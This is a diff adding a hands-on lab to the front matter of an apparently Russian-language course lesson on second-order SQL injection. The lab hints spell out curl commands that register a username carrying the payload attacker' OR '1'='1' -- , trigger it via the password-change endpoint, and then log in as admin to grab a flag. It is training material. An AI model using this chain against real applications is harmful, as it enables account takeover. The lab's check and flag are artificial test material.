@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 45
 summary: "Second-order-инъекции: payload сохраняется и исполняется позже в другом контексте — почему сканеры их не находят."
+lab:
+  kind: shell
+  title: "Практика: second-order инъекция"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Регистрация параметризована — payload там безвреден: `curl -s -X POST https://app.example/register --data-urlencode "username=attacker' OR '1'='1' -- " --data-urlencode 'password=Passw0rd!'`.
+    - Sink — смена пароля, где сохранённый логин склеивается в `UPDATE ... WHERE username='<логин>'`.
+    - Смени пароль: `curl -s -X POST https://app.example/change-password --data-urlencode 'newpass=hacked123' -b cookies.txt`.
+    - Войди как admin: `curl -s -X POST https://app.example/login --data-urlencode 'username=admin' --data-urlencode 'password=hacked123' | grep 'nto{' > found.txt`, затем `check`.
 ---
 
 ## Задача
